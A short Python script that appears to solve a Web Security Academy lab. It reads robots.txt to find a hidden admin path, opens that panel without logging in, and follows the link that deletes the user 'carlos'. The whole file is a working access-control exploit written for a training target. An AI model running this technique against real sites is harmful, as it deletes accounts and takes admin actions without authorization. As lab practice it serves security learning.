import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'aca61f391fe67bd8c067016000dc00b1.web-security-academy.net'

url = f'https://{site}/robots.txt'
resp = s.get(url)
match_line = [line for line in resp.text.split('\n') if 'admin' in line]
uri = match_line[0].split(' ')[1]

url = f'https://{site}{uri}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')